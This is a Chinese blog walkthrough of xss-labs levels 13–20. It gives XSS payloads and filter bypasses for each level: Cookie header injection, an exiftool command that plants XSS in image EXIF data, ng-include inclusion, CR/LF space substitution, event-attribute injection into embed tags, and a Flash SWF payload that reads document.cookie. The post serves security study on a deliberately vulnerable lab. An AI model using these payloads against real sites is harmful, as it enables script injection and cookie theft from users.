+<h2 id="level-13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过"><a href="#level-13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过" class="headerlink" title="level 13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过"></a>level 13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过</h2><h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 11相似，也是隐藏表单，这里也是有两个参数可以接收并返回在了html的value中，分别是t_sort参数和t_cook参数。关于t_sort参数的分析和level 11的一样，具体可看level 11。</p>
+<p>那么这里来看看t_cook参数：</p>
+<p>t_cook参数接收了并返回在了html的value中，而且不是像t_sort参数那样以get方式来获取值，而是获取http头里的<code>Cookie</code>字段中user的cookie值。</p>
+<p>这里先来简单介绍下cookie的机制：</p>
+<p>当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历以下4个步骤：</p>
+<p>客户端发送一个请求到服务器--&gt; 服务器发送一个HttpResponse响应到客户端，其中包含Set-Cookie的头部--&gt; 客户端保存cookie，之后向服务器发送请求时，HttpRequest请求中会包含一个Cookie的头部--&gt;服务器返回响应数据</p>
+<p>那么这里就要用到burpsuite来抓包了：</p>
+<p>这里我们首先把Proxy里抓到的请求包发送到Intruder里，这时候可以看到请求包这里还没有cookie。然后服务器发送一个HttpResponse响应到客户端，其中包含<code>Set-Cookie</code>的头部</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/040-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>然后这时候再把Proxy里的包都放(Forward)了，然后再用burp重新拦截，再刷新下网站，这时候我们的请求包里才有了Cookie字段：<code>Cookie: user=call+me+maybe%3F</code>。然后改成下面的payload:</p>
+<p>payload：<code>Cookie:user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/041-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>放包后，然后页面会生成一个框，点它，成功</p>
+<h2 id="后台源代码分析-12"><a href="#后台源代码分析-12" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/042-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>获取get请求的keyword、t_sort变量和<code>Cookie</code>字段中user的cookie值，get提交的t_sort参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体、过滤<code>Cookie</code>字段中user的cookie值的尖括号后输出在html代码中</p>
+<h2 id="level-14：exif-xss-上传一个含有xss代码的图片触发xss"><a href="#level-14：exif-xss-上传一个含有xss代码的图片触发xss" class="headerlink" title="level 14：exif xss(上传一个含有xss代码的图片触发xss)"></a>level 14：exif xss(上传一个含有xss代码的图片触发xss)</h2><h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>这一关先查看页面源码，通过<code>iframe</code>标签引入了一个<code>http://exofvoewer.org</code>。因为<code>iframe</code>调用的文件地址访问失败，已经无法进行测试了。</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/043-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/044-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>结合网上师傅们的文章，了解到这关主要考察的是<code>exif xss</code>漏洞，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的<code>exif</code>元数据被修改为xss的payload,成功利用弹框。</p>
+<p>具体实现可以使用kali下的<code>exiftool</code>工具，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">exiftool -FIELD=XSS FILE<br><br>exiftool -Artist=’ “&gt;&lt;img src=1 οnerrοr=alert(document.domain)&gt;’ brute.jpeg<br></code></pre></td></tr></table></figure>
+
+<p>这里可以参考这位师傅的文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%BA%E4%BA%86%E6%96%B9%E4%BE%BF%E7%9B%B4%E6%8E%A5%E6%88%AA%E5%8F%96%E6%96%87%E7%AB%A0%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12，这里为了方便直接截取文章中的图片</a></p>
+<p>其实以前乌云就爆出个这个<code>exif xss</code>漏洞，上传一个含有xss代码的图片触发xss。</p>
+<p><code>exif xss</code>：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/045-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/046-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/047-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/048-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-13"><a href="#后台源代码分析-13" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;title&gt;欢迎来到level 14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level 14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level 15.php?src=1.gif&gt;点我进level 15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这一关的后台源代码其实就是原始的页面源代码了，在上面过程也有总结，这里就不赘述了。</p>
+<h2 id="level-15：ng-include包含同一域名下有xss漏洞的文件来触发xss"><a href="#level-15：ng-include包含同一域名下有xss漏洞的文件来触发xss" class="headerlink" title="level 15：ng-include包含同一域名下有xss漏洞的文件来触发xss"></a>level 15：ng-include包含同一域名下有xss漏洞的文件来触发xss</h2><h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>这一关提示让我自己走出去。这里看来只能在url里面操作了。url中发现了<code>src</code>参数，我修改<code>src=javascript:alert(1)</code>，回车后，右键查看原始的页面源代码，发现它把<code>src</code>的参数值拼接到了最后一行<code>&lt;body&gt;&lt;span class=&quot;ng-include:javascript:alert(1)&quot;&gt;&lt;/span&gt;&lt;/body&gt;</code>里输出。</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/049-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这里使用了<code>ng-include</code>属性，这里来介绍一下：</p>
+<p><code>AngularJS</code>中的<code>ng-include</code>指令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ng-include指令用于包含外部的 HTML 文件。<br><br>包含的内容将作为指定元素的子节点。<br><br>ng-include属性的值可以是一个表达式，返回一个文件名。<br><br>默认情况下，包含的文件需要包含在同一个域名下。<br></code></pre></td></tr></table></figure>
+
+<p>那么这里就用包含同一个域名下有xss漏洞的文件，触发xss。这里需要注意一点：这里一定要访问上面的<code>angular.min.js</code>这个js文件，才能进行包含。</p>
+<p>那么这里来构造payload：<code>?src=&#39;http://同一域名/xss-labs-master/level 1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
+<p>也可以是<code>?src=&#39;level 1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/050-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-14"><a href="#后台源代码分析-14" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/051-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><code>ng-include</code>属性采用<code>htmlspecialchars</code>函数对获取的src参数中的预定义的字符转换为 HTML 实体。</p>
+<h2 id="level-16：用回车符CR-0d-和换行符LF-0a-取代空格绕过"><a href="#level-16：用回车符CR-0d-和换行符LF-0a-取代空格绕过" class="headerlink" title="level 16：用回车符CR(%0d) 和换行符LF(%0a)取代空格绕过"></a>level 16：用回车符CR(%0d) 和换行符LF(%0a)取代空格绕过</h2><h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>经过测试，发现对<code>script</code>、<code>/</code>、<code>空格</code>进行了转换，需要进行绕过：</p>
+<p>这里用回车符CR(%0d) 和换行符LF(%0a)取代空格（在HTML中%0a和%0d是可以当成空格使用的）</p>
+<p>payload：<code>?keyword=&lt;img%0asrc=1%0donerror=alert(1)&gt;</code></p>
+<p>或者<code>&lt;img%0asrc=1%0donmouseover=alert(1)&gt;</code></p>
+<p>我们用<code>&lt;img%0asrc=1%0donmouseover=alert(1)&gt;</code>，这样可以查看原始的页面源代码：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/052-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>页面会有个发生了错误的图片，把鼠标移到上面，便成功</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/053-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-15"><a href="#后台源代码分析-15" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/054-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，然后采用<code>strtolower</code>函数过滤掉其中的<code>script</code>、<code>空格</code>、<code>/</code></p>
+<h2 id="level-17：swf文件导致的flash-xss漏洞误会"><a href="#level-17：swf文件导致的flash-xss漏洞误会" class="headerlink" title="level 17：swf文件导致的flash xss漏洞误会"></a>level 17：swf文件导致的<code>flash xss</code>漏洞误会</h2><h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p>右键查看原始的页面源代码，发现了swf文件，这里一开始以为是存在<code>flash xss</code>漏洞，需要利用它来完成。但是一直没有利用成功，结果查了一下，并不需要这样完成</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/055-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>因为这里<code>arg01</code>和<code>arg02</code>提交的参数就存在了注入点：<code>?arg01=q&amp;arg02=a</code>。经过尝试还把尖括号和双引号给html实体编码了</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/056-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>那么构造payload：<code>?arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
+<p>或者<code>?arg01= onmouseover=alert(1)&amp;arg02=b</code></p>
+<p>然后把鼠标移到swf文件上面，便成功了。</p>
+<p>右键查看下原始的页面源代码：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/057-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>payload中要注意<code>onmouseover</code>事件前面必须要空格，不然会变成这样。下面的后台源代码分析会讲到原理</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/058-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-16"><a href="#后台源代码分析-16" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;<br>?&gt;<br>&lt;h2 align=center&gt;成功后，&lt;a href=level 18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里用到了<code>&lt;embed&gt;</code>标签，是用来嵌入图片的。将get提交的arg01和arg02参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体。</p>
+<p>因为这里arg01和arg02这两个参数是互相拼接起来的，所以比如在输入arg01参数时在其后面加一个空格，当浏览器解析到它的时候就会停止判断，然后将<code>onmouseover</code>事件看作另外一个属性；arg02参数同理。</p>
+<h2 id="level-18：同level-17"><a href="#level-18：同level-17" class="headerlink" title="level 18：同level 17"></a>level 18：同level 17</h2><h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>只能说是和level 17一模一样了，除了图片不同。直接用level 17的payload直接通关。</p>
+<h2 id="后台源代码分析-17"><a href="#后台源代码分析-17" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>emmm，这里除了swf的文件名改成了xsf02.swf，其它都和level 17差不多。</p>
+<h2 id="level-19：flash-xss-反编译"><a href="#level-19：flash-xss-反编译" class="headerlink" title="level 19：flash xss(反编译)"></a>level 19：flash xss(反编译)</h2><h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/059-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>右键查看原始的页面代码，发现访问<code>swf</code>文件的时候在传参</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/060-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>直接访问这个链接后，页面就是上面那样了：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/061-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这里可以看到文件(即<code>flash</code>文件)里面提示了<code>sifr.js</code>是没有定义的。这不仅仅是个图片，需要对<code>swf</code>文件(即<code>flash</code>文件)进行反编译查看源码。这里使用的是<code>jpex</code>工具，它是针对flash的反编译工具。链接在这里：<a target="_blank" rel="noopener" href="https://github.com/jindrapetrik/jpexs-decompiler">GitHub - jindrapetrik&#x2F;jpexs-decompiler: JPEXS Free Flash Decompiler</a></p>
+<p>具体反编译过程也可以参考这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/119211168">Flash XSS漏洞快速上手</a></p>
+<p>这里也讲讲这里的过程：</p>
+<p>我通过<code>sifr</code>找到了对应的脚本位置：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/062-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>在这个脚本中我找到了<code>flash</code>显示的信息，关键在<code>%s</code>这里：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/063-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>接着去定位<code>%s</code>：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/064-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这里先把<code>VERSION_WARNING</code>以<code>%s</code>打散成数组，然后再以<code>version</code>的方式组合成字符串。可是搜索了一圈，并没有<code>version</code>，只通过<code>p-code</code>发现了这样的一个东西：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/065-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>感觉这里是通过<code>url</code>来获取参数值的，于是构造了一个这样的参数<code>?arg01=version&amp;arg02=123</code>。结果也不出所料，出现了<code>123</code>:</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/066-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>经过了许多种的尝试过后了，测试出了只有<code>&lt;a&gt;</code>这种是可以的，那么就构造payload：<code>?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;</code></p>
+<p>然后页面出现了<code>xss</code>，点击就成功了。</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/067-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="后台源代码分析-18"><a href="#后台源代码分析-18" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里用到了<code>&lt;embed&gt;</code>标签，是用来嵌入图片的。将get提交的arg01和arg02参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体。</p>
+<h2 id="level-20：同level-19"><a href="#level-20：同level-19" class="headerlink" title="level 20：同level 19"></a>level 20：同level 19</h2><h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 19相似，这里直接给出payload。</p>
+<p>payload：<code>?arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height</code></p>
+<h2 id="后台源代码分析-19"><a href="#后台源代码分析-19" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &#x27;&lt;embed src=&quot;xsf04.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里用到了<code>&lt;embed&gt;</code>标签，是用来嵌入图片的。将get提交的arg01和arg02参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体。</p>
+<p>参考原文：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/287655.html">xss各种姿势的学习(包含绕过)和个人重要总结</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/" class="category-chain-item">漏洞专题</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/" title="带外攻击OOB（RCE无回显骚思路总结）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">带外攻击OOB（RCE无回显骚思路总结）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/" title="开启nvidia的rtx视频增强">
+                        <span class="hidden-mobile">开启nvidia的rtx视频增强</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
